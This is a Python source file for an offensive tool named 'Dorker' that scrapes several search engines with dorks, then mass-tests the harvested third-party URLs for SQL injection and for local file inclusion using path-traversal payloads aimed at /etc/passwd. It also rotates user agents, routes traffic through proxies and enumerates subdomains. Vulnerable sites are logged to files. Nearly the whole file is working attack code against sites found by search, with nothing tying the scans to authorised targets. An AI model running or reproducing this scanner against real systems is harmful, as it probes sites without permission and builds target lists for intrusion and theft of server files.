import os
import json
import random
import urllib3
import platform
from colorama import Fore
import concurrent.futures
from bs4 import BeautifulSoup
from datetime import datetime
from urllib3.util import Retry
from urllib3.util import Timeout

version = "1.7"
info = (Fore.RESET + "\n  Dorker" + "\n   Version: " + version + " made with ♥ by FARBER")
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
dorks = []
dorker_urls = []
sites = []
proxy_list = []
enable_proxy = " "
result_name = "dorker_results.txt"
num_threads = 15

payload = [
    r'../../../../../../../../../../../../../../../../../etc/passwd',
    r'../../../../../../../../../../../../../../../../../etc/passwd%00',
    r'/etc/passwd',
    r'/etc/passwd%00'
]

ua = ['Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; zh-cn) Opera 8.65',
      'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; en) Opera 9.50',
      'Opera/9.10 (Windows NT 6.0; U; en)',
      'Opera/9.10 (Windows NT 6.0; U; it-IT)',
      'Opera/9.10 (X11; Linux i386; U; en)',
      'Mozilla/4.0 (compatible; MSIE 4.0; Windows 95)',
      'Mozilla/4.0 (compatible; MSIE 4.0; Windows 95; .NET CLR 1.1.4322; .NET CLR 2.0.50727)',
      'Mozilla/4.0 (compatible; MSIE 4.0; Windows NT)',
      'Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; MSIECrawler)',
      'Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; Q312461)',
      'Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; Q312461; T312461)',
      'Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; SV1)',
      'Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; Wanadoo 5.1)',
      'Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; Wanadoo 5.6)',
      'Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; YComp 5.0.0.0)',
      'Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; YComp 5.0.0.0; Hotbar 4.1.8.0)',
      'Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; YComp 5.0.2.4)',
      'Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 5.1)',
      'Mozilla/4.0 (Mozilla/4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1)',
      'Mozilla/4.0 (Mozilla/4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1; .NET CLR 3.0.04506.30)',
      'Mozilla/4.0 (MSIE 6.0; Windows NT 5.0)',
      'Mozilla/4.0 (MSIE 6.0; Windows NT 5.1)',
      'Mozilla/4.0 WebTV/2.6 (compatible; MSIE 4.0)',
      'Mozilla/4.0 (Windows; MSIE 6.0; Windows NT 5.0)',
      'Mozilla/4.0 (Windows; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)',
      'Mozilla/4.0 (Windows; MSIE 6.0; Windows NT 5.2)',
      'Mozilla/4.0 (Windows; MSIE 6.0; Windows NT 6.0)',
      'Mozilla/4.0 (Windows; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)',
      'Mozilla/4.0 (X11; MSIE 6.0; i686; .NET CLR 1.1.4322; .NET CLR 2.0.50727; FDM)',
      'Mozilla/5.0 (compatible; MSIE 10.0; Macintosh; Intel Mac OS X 10_7_3; Trident/6.0)',
      'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)',
      'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)',
      'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; chromeframe/12.0.742.112)',
      'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 7.1; Trident/5.0)',
      'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko',
      'Mozilla/5.0 (Windows; U; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)',
      'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 5.2)',
      'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; el-GR)',
      'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
      'Mozilla/5.0 (Windows; U; Windows NT 6.1; zh-CN) AppleWebKit/533+ (KHTML, like Gecko)']

header = {
    'User-agent': random.choice(ua),
    'Accept-Encoding': 'gzip, deflate',
    'Accept': '*/*',
    'Connection': 'keep-alive'
}
http = urllib3.PoolManager(headers=header, cert_reqs=False, num_pools=30)

colors = list(vars(Fore).values())
if '\x1b[30m' in colors:
    # While
    # colors.remove('\x1b[30m')
    # Red
    # colors.remove('\x1b[31m')
    # Purple
    # colors.remove('\x1b[35m')
    # Yellow
    colors.remove('\x1b[32m')
    # Icy
    # colors.remove('\x1b[36m')
    # Navy white
    colors.remove('\x1b[37m')
    # Blue
    # colors.remove('\x1b[34m')
    # Another yellow
    # colors.remove('\x1b[33m')
    # Navy white
    colors.remove('\x1b[39m')
    # Navy red
    # colors.remove('\x1b[91m')
    # Yellow
    # colors.remove('\x1b[92m')
    # Navy yellow
    # colors.remove('\x1b[93m')
    # Navy Blue
    # colors.remove('\x1b[94m')
    # Violet
    # colors.remove('\x1b[95m')
    # Light blue
    # colors.remove('\x1b[96m')
    # Black
    colors.remove('\x1b[97m')
    # Grey
    colors.remove('\x1b[90m')


def dorker_logo():
    dorker_logotypes = [r'''
     ____  ____  ____  __ __ __________ 
    / __ \/ __ \/ __ \/ //_// ____/ __ \
   / / / / / / / /_/ / ,<  / __/ / /_/ /
  / /_/ / /_/ / _, _/ /| |/ /___/ _, _/ 
 /_____/\____/_/ |_/_/ |_/_____/_/ |_|
''', r'''
    ___      __     ___    _  __    ___     ___   
   |   \    /  \   | _ \  | |/ /   | __|   | _ \  
   | |) |  | () |  |   /  | ' <    | _|    |   /  
   |___/   _\__/   |_|_\  |_|\_\   |___|   |_|_\  
 _|"""""|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""| 
 "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 
''', r'''
 .--.  .--. .--. .   ..---..--. 
 |   ::    :|   )|  / |    |   )
 |   ||    ||--' |-'  |--- |--' 
 |   ;:    ;|  \ |  \ |    |  \ 
 '--'  `--' '   `'   `'---''   `
''', r'''
 +-+-+-+-+-+-+
 |D|O|R|K|E|R|
 +-+-+-+-+-+-+
''']
    logotype = random.choice(dorker_logotypes)
    if platform.system() == "Windows":
        os.system("@cls")
    else:
        os.system("clear")
    print(''.join([random.choice(colors) + char for char in logotype]) + info + "\n")


def dorker(dork):
    global dorks, enable_proxy, http, proxy_list, dorker_urls
    print(Fore.RESET + "\nDORK: " + str(dork))
    for pages in range(1, 16):
        f = open(result_name, "a", encoding="utf=8")

        # -- Search-results --------------------------------------------------------------------------------------------
        print(Fore.RESET + "Search-results:")
        if enable_proxy == "y" or enable_proxy == "Y":
            try:
                proxy = urllib3.ProxyManager(random.choice(proxy_list), headers=header, cert_reqs=False)
                send1 = proxy.request('GET', "http://www1.search-results.com/web?q=" + dork + "&page=" + str(pages),
                                      retries=Retry(3), timeout=Timeout(5))
            except urllib3.exceptions:
                send1 = http.request("GET", "http://www1.search-results.com/web?q=" + dork + "&page=" + str(pages),
                                     retries=Retry(3), timeout=Timeout(5))
        else:
            send1 = http.request("GET", "http://www1.search-results.com/web?q=" + dork + "&page=" + str(pages),
                                 retries=Retry(3), timeout=Timeout(5))

        try:
            parsing1 = BeautifulSoup(send1.data.decode('utf-8'), features="html.parser")
        except Exception as ex:
            print(Fore.YELLOW + "Error:\n" + str(ex) + "Trying latin-1...")
            parsing1 = BeautifulSoup(send1.data.decode('latin-1'), features="html.parser")

        for data in parsing1.find_all("cite"):
            print(Fore.RESET + data.string)
            # f.write(data.string + "\n")
            if str(data.string) not in dorker_urls:
                dorker_urls.append(str(data.string))

        # -- Auone -----------------------------------------------------------------------------------------------------
        print(Fore.RESET + "Auone:")
        if enable_proxy == "y" or enable_proxy == "Y":
            try:
                proxy = urllib3.ProxyManager(random.choice(proxy_list), headers=header, cert_reqs=False)
                send2 = proxy.request("GET", "https://search.auone.jp/?q=" + dork + "&ie=UTF-8&page=" + str(pages),
                                      retries=Retry(3), timeout=Timeout(5))
            except urllib3.exceptions:
                send2 = http.request("GET", "https://search.auone.jp/?q=" + dork + "&ie=UTF-8&page=" + str(pages),
                                     retries=Retry(3), timeout=Timeout(5))
        else:
            send2 = http.request("GET", "https://search.auone.jp/?q=" + dork + "&ie=UTF-8&page=" + str(pages),
                                 retries=Retry(3), timeout=Timeout(5))

        try:
            parsing2 = BeautifulSoup(send2.data.decode('utf-8'), features="html.parser")
        except Exception as ex:
            print(Fore.YELLOW + "Error:\n" + str(ex) + "Trying latin-1...")
            parsing2 = BeautifulSoup(send2.data.decode('latin-1'), features="html.parser")
        for data in parsing2.find_all("h2", class_="web-Result__site u-TextEllipsis"):
            for url in data.find_all("a"):
                print(Fore.RESET + str(url.get('href')))
                # f.write(url.get('href') + "\n")
                if str(url.get('href')) not in dorker_urls:
                    dorker_urls.append(str(url.get('href')))

        # -- Qwant -----------------------------------------------------------------------------------------------------
        print(Fore.RESET + "Qwant:")
        if enable_proxy == "y" or enable_proxy == "Y":
            try:
                proxy = urllib3.ProxyManager(random.choice(proxy_list), headers=header, cert_reqs=False)
                send3 = proxy.request("GET", "https://lite.qwant.com/?q=" + dork + "&p=" + str(pages), retries=Retry(4),
                                      timeout=Timeout(5))
            except urllib3.exceptions:
                send3 = http.request("GET", "https://lite.qwant.com/?q=" + dork + "&p=" + str(pages), retries=Retry(4),
                                     timeout=Timeout(5))
        else:
            send3 = http.request("GET", "https://lite.qwant.com/?q=" + dork + "&p=" + str(pages), retries=Retry(4),
                                 timeout=Timeout(5))

        try:
            parsing3 = BeautifulSoup(send3.data.decode('utf-8'), features="html.parser")
        except Exception as ex:
            print("Error:\n" + str(ex) + "Trying latin-1...")
            parsing3 = BeautifulSoup(send3.data.decode('latin-1'), features="html.parser")
        for data in parsing3.find_all("p", class_="url"):
            print(str(data.string).replace(" ", ""))
            # f.write(str(data.string).replace(" ", "") + "\n")
            if str(data.string).replace(" ", "") not in dorker_urls:
                dorker_urls.append(str(data.string).replace(" ", ""))

        # -- Lilo ------------------------------------------------------------------------------------------------------
        print(Fore.RESET + "Lilo:")
        if enable_proxy == "y" or enable_proxy == "Y":
            try:
                proxy = urllib3.ProxyManager(random.choice(proxy_list), headers=header, cert_reqs=False)
                send4 = proxy.request("GET", "https://search.lilo.org/?q=" + dork + "&date=All&page=" + str(pages),
                                      retries=Retry(4), timeout=Timeout(5))
            except urllib3.exceptions:
                send4 = http.request("GET", "https://search.lilo.org/?q=" + dork + "&date=All&page=" + str(pages),
                                     retries=Retry(4), timeout=Timeout(5))
        else:
            send4 = http.request("GET", "https://search.lilo.org/?q=" + dork + "&date=All&page=" + str(pages),
                                 retries=Retry(4), timeout=Timeout(5))

        try:
            parsing4 = BeautifulSoup(send4.data.decode('utf-8'), features="html.parser")
        except Exception as ex:
            print(Fore.YELLOW + "Error:\n" + str(ex) + "Trying latin-1...")
            parsing4 = BeautifulSoup(send4.data.decode('latin-1'), features="html.parser")
        for data in parsing4.find_all("a", class_="resulturl d-block"):
            print(Fore.RESET + str(data.get("href")))
            # f.write(data.get("href") + "\n")
            if str(data.get("href")) not in dorker_urls:
                dorker_urls.append(str(data.get("href")))

        # -- Mywebsearch -----------------------------------------------------------------------------------------------
        print(Fore.RESET + "Mywebsearch:")
        if enable_proxy == "y" or enable_proxy == "Y":
            try:
                proxy = urllib3.ProxyManager(random.choice(proxy_list), headers=header, cert_reqs=False)
                send5 = proxy.request("GET", "https://int.search.mywebsearch.com/mywebsearch/GGmain.jhtml?searchfor=" +
                                      dork + "&pn=" + str(pages), retries=Retry(4), timeout=Timeout(5))
            except urllib3.exceptions:
                send5 = http.request("GET", "https://int.search.mywebsearch.com/mywebsearch/GGmain.jhtml?searchfor=" +
                                     dork + "&pn=" + str(pages), retries=Retry(4), timeout=Timeout(5))
        else:
            send5 = http.request("GET", "https://int.search.mywebsearch.com/mywebsearch/GGmain.jhtml?searchfor=" +
                                 dork + "&pn=" + str(pages), retries=Retry(4), timeout=Timeout(5))

        try:
            parsing5 = BeautifulSoup(send5.data.decode('utf-8'), features="html.parser")
        except Exception as ex:
            print("Error:\n" + str(ex) + "Trying latin-1...")
            parsing5 = BeautifulSoup(send5.data.decode('latin-1'), features="html.parser")
        for data in parsing5.find_all("cite"):
            print(Fore.RESET + str(data.string))
            # f.write(data.string + "\n")
            if str(data.string) not in dorker_urls:
                dorker_urls.append(str(data.string))

        f.close()


def sqli_checker(site):
    global enable_proxy, http, proxy_list
    error1 = "You have an error in your SQL syntax"
    error2 = "Warning: mysql_fetch_array()"
    if "=" in site:
        try:
            if enable_proxy == "y" or enable_proxy == "Y":
                try:
                    proxy = urllib3.ProxyManager(random.choice(proxy_list), headers=header, cert_reqs=False)
                    send = proxy.request("GET", str(site) + "'", retries=Retry(4), timeout=Timeout(5))
                except urllib3.exceptions:
                    send = http.request("GET", str(site) + "'", retries=Retry(4), timeout=Timeout(5))
            else:
                send = http.request("GET", str(site) + "'", retries=Retry(4), timeout=Timeout(5))

            if bytes(error1, encoding="utf-8") in send.data:
                print(Fore.GREEN + str(site) + " seems vulnerable!")
                injectable_url = open("sqli.txt", 'a')
                injectable_url.write(str(site) + "\n")
                injectable_url.close()
            elif bytes(error2, encoding="utf-8") in send.data:
                print(Fore.GREEN + str(site) + " seems vulnerable!")
                injectable_url = open("sqli.txt", 'a')
                injectable_url.write(str(site) + "\n")
                injectable_url.close()
            else:
                print(Fore.RED + str(site) + " not vulnerable!")

        except urllib3.exceptions:
            print(Fore.YELLOW + "\n[!] Exception: " + str(site))
    else:
        print(Fore.YELLOW + "Skipping " + site + "")


def lfi_checker(url_list):
    global sites, payload, enable_proxy, http, proxy_list
    if "=" in url_list:
        if not str(url_list).startswith("https://cve.mitre.org") and not str(url_list).startswith(
                "http://cve.mitre.org"):
            site = url_list.split("=")
            number_of_parameters = len(site)
            # 1
            if number_of_parameters == 2:
                try:
                    print(Fore.RESET + "Trying " + site[0] + "=PAYLOAD")
                    for exploit in payload:

                        # Request with payload
                        if enable_proxy == "y" or enable_proxy == "Y":
                            try:
                                proxy = urllib3.ProxyManager(random.choice(proxy_list), headers=header, cert_reqs=False)
                                http_request1 = proxy.request("GET", str(site[0]) + "=" + exploit, retries=Retry(4),
                                                              timeout=Timeout(9))
                            except urllib3.exceptions:
                                http_request1 = http.request("GET", str(site[0]) + "=" + exploit, retries=Retry(4),
                                                             timeout=Timeout(9))
                        else:
                            http_request1 = http.request("GET", str(site[0]) + "=" + exploit, retries=Retry(4),
                                                         timeout=Timeout(9))
                        http_response1 = str(http_request1.data)

                        if "root:" in http_response1:
                            print(Fore.GREEN + "[+] Vulnerable URL: " + site[0] + "=" + exploit)
                            f = open("lfi.txt", "a")
                            f.write(site[0] + "=" + exploit + "\n")
                            f.close()
                except urllib3.exceptions:
                    print(Fore.YELLOW + "\n[!] Exception: " + str(url_list))

            # 2
            elif number_of_parameters == 3:
                try:
                    print(Fore.RESET + "Trying " + str(url_list.split("&")[0]) + "&" + str(
                        url_list.split("&")[1].split("=")[0]) + "=PAYLOAD")
                    for exploit in payload:

                        # Request with payload
                        if enable_proxy == "y" or enable_proxy == "Y":
                            try:
                                proxy = urllib3.ProxyManager(random.choice(proxy_list), headers=header, cert_reqs=False)
                                http_request2_1 = proxy.request("GET", str(url_list.split("&")[0]) + "&" +
                                                                str(url_list.split("&")[1].split("=")[0]) + "=" +
                                                                exploit, retries=Retry(4), timeout=Timeout(9))
                            except urllib3.exceptions:
                                http_request2_1 = http.request("GET", str(url_list.split("&")[0]) + "&" +
                                                               str(url_list.split("&")[1].split("=")[0]) + "=" +
                                                               exploit, retries=Retry(4), timeout=Timeout(9))
                        else:
                            http_request2_1 = http.request("GET", str(url_list.split("&")[0]) + "&" +
                                                           str(url_list.split("&")[1].split("=")[0]) + "=" +
                                                           exploit, retries=Retry(4), timeout=Timeout(9))
                        http_response2_1 = str(http_request2_1.data)

                        if "root:" in http_response2_1:
                            print(Fore.GREEN + "[+] Vulnerable URL: " + str(url_list.split("&")[0]) + "&" + str(
                                url_list.split("&")[1].split("=")[0]) + "=" + exploit)
                            f = open("lfi.txt", "a")
                            f.write(str(url_list.split("&")[0]) + "&" + str(
                                url_list.split("&")[1].split("=")[0]) + "=" + exploit + "\n")
                            f.close()

                        # Request with payload
                        print(str(url_list.split("&")[0].split("=")[0]) + "=" + exploit + "&" + str(
                            url_list.split("&")[1]))
                        http_request2_2 = http.request("GET", str(
                            url_list.split("&")[0].split("=")[0]) + "=" + exploit + "&" + str(url_list.split("&")[1]),
                                                       retries=Retry(4), timeout=Timeout(9))
                        http_response2_2 = str(http_request2_2.data)
                        if "root:" in http_response2_2:
                            print(Fore.GREEN + "[+] Vulnerable URL: " + str(url_list.split("&")[0]) + "&" + str(
                                url_list.split("&")[1].split("=")[0]) + "=" + exploit)
                            f = open("lfi.txt", "a")
                            f.write(str(url_list.split("&")[0]) + "&" + str(
                                url_list.split("&")[1].split("=")[0]) + "=" + exploit + "\n")
                            f.close()
                except urllib3.exceptions:
                    print(Fore.YELLOW + "\n[!] Exception: " + str(url_list))

            elif number_of_parameters > 4:
                try:
                    print(Fore.RESET + "Trying " + site[0] + "=PAYLOAD")
                    for exploit in payload:

                        # Request with payload
                        if enable_proxy == "y" or enable_proxy == "Y":
                            try:
                                proxy = urllib3.ProxyManager(random.choice(proxy_list), headers=header, cert_reqs=False)
                                http_request3_1 = proxy.request("GET", str(site[0]) + "=" + exploit, retries=Retry(4),
                                                                timeout=Timeout(9))
                            except urllib3.exceptions:
                                http_request3_1 = http.request("GET", str(site[0]) + "=" + exploit, retries=Retry(4),
                                                               timeout=Timeout(9))
                        else:
                            http_request3_1 = http.request("GET", str(site[0]) + "=" + exploit, retries=Retry(4),
                                                           timeout=Timeout(9))
                        http_request3_1 = str(http_request3_1.data)

                        if "root:" in http_request3_1:
                            print(Fore.GREEN + "[+] Vulnerable URL: " + site[0] + "=" + exploit)
                            f = open("lfi.txt", "a")
                            f.write(site[0] + "=" + exploit + "\n")
                            f.close()
                except urllib3.exceptions:
                    print(Fore.YELLOW + "\n[!] Exception: " + str(url_list))

            else:
                pass


def specific_scan(site):
    global http, proxy_list
    current_time = datetime.today().strftime("%H.%M.%S-%d-%m")
    domain_to_check = ""

    # Get subdomains
    print(Fore.RESET + "\nChecking dns.bufferover.run...\n")

    # print(site.replace('https://www.', ''))
    # print(site.split('/')[-1])

    if site.startswith("http://www."):
        domain_to_check = site.replace('http://www.', '')
    elif site.startswith("https://www."):
        domain_to_check = site.replace('https://www.', '')
    elif site.startswith("http://"):
        domain_to_check = site.replace('http://', '')
    elif site.startswith("https://"):
        domain_to_check = site.replace('https://', '')
    else:
        print(Fore.YELLOW + "Error")

    send = http.request("GET", "https://dns.bufferover.run/dns?q=" + domain_to_check)
    try:
        parsing = send.data.decode('utf-8')
    except Exception as ex:
        print(Fore.RESET + "Error:\n" + str(ex) + "Trying latin-1...")
        parsing = send.data.decode('latin-1')
    json_response = json.loads(parsing)
    subdomain_list = json_response['FDNS_A']
    for subdomain in subdomain_list:
        print(Fore.RESET + str(subdomain))
        f = open(str(current_time) + ".subdomains.txt", "a", encoding="utf=8")
        f.write(str(subdomain) + "\n")
        f.close()

    # Get hrefs from site
    print(Fore.RESET + "\n[+] Grabbing hrefs from site...\n")
    send = http.request("GET", site)
    try:
        parsing = BeautifulSoup(send.data.decode('utf-8'), features="html.parser")
    except Exception as ex:
        print(Fore.RESET + "Error:\n" + str(ex) + "Trying latin-1...")
        parsing = BeautifulSoup(send.data.decode('latin-1'), features="html.parser")
    for data in parsing.find_all("a"):
        if str(data.get('href')) == "None":
            continue
        elif str(data.get('href')) == 'javascript:void(0)':
            continue
        # if str(data.get('href')).startswith("/"):
            # to_write = str(site) + str(data.get('href'))
        else:
            to_write = data.get('href')
        print(Fore.RESET + str(to_write))
        f = open(str(current_time) + ".hrefs.txt", "a", encoding="utf=8")
        f.write(str(to_write) + "\n")
        f.close()

    # Running Dorker against subdomains we found before
    for subdomain in subdomain_list:
        dorker("inurl:" + subdomain.split(',')[-1])


def main():
    dorker_logo()
    global sites, dorks, enable_proxy, proxy_list, dorker_urls, http

    try:
        # Example proxy_list.txt:
        # http://localhost:3128
        # http://198.67.54.27:1337
        # and so on
        if os.path.exists("proxy_list.txt"):
            enable_proxy = input(Fore.RESET +
                                 "[!] File with proxies exists, would you like to enable proxy mode? y/n\n [:]==> ")
            proxy_file = open("proxy_list.txt", "r", encoding="utf-8")
            proxy_list = [line.split("\n")[0] for line in proxy_file.readlines()]
        else:
            enable_proxy = "n"

    except Exception as ex:
        print(Fore.RESET + "[!] Exception: " + str(ex))

    dorker_logo()
    usr_inpt = input('''
[1] Dorker
[2] SQLi checker
[3] LFI checker
[4] Scan specific site
[99] Exit
 [:]==> ''')

    if usr_inpt == "1":
        print(Fore.RESET + "[+] Checking dorks.txt...\n")
        file_with_dorks = open("dorks.txt", "r")
        dorks = [line.split("\n")[0] for line in file_with_dorks.readlines()]
        for dork in dorks:
            print(Fore.RESET + dork)
        print(Fore.RESET + " ")
        file_with_dorks.close()

        dorker_mode = input(Fore.RESET + "\n[!] Start dorker in multithread mode? y/n\n [:]==> ")
        if dorker_mode != "n":
            with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
                executor.map(dorker, dorks)

        else:
            for dork in dorks:
                dorker(dork)

        f = open(result_name, "a", encoding="utf=8")
        for url in dorker_urls:
            f.write(url + "\n")
        f.close()

        print(Fore.RESET + "\nThanks for using D0RK3R!")
        exit(0)

    elif usr_inpt == "2":
        try:
            file_with_dorker_results = open(result_name, "r")
            sites = [line.split("\n")[0] for line in file_with_dorker_results.readlines()]
            file_with_dorker_results.close()
        except Exception as ex:
            print(Fore.RESET + "Error:\n" + str(ex))

        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
            executor.map(sqli_checker, sites)

        print(Fore.RESET + "\nThanks for using D0RK3R!")
        exit(0)

    elif usr_inpt == "3":
        try:
            file_with_dorker_results = open(result_name, "r")
            sites = [line.split("\n")[0] for line in file_with_dorker_results.readlines()]
            file_with_dorker_results.close()
        except Exception as ex:
            print(Fore.RESET + "Error:\n" + str(ex))

        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
            executor.map(lfi_checker, sites)

        print(Fore.RESET + "\nThanks for using D0RK3R!")
        exit(0)

    elif usr_inpt == "4":
        site = input(Fore.RESET + "[!] Enter site:\n [:]==> ")
        specific_scan(site)
        exit(0)

    else:
        print(Fore.RESET + "\nThanks for using D0RK3R!")
        exit(0)


if __name__ == '__main__':
    main()
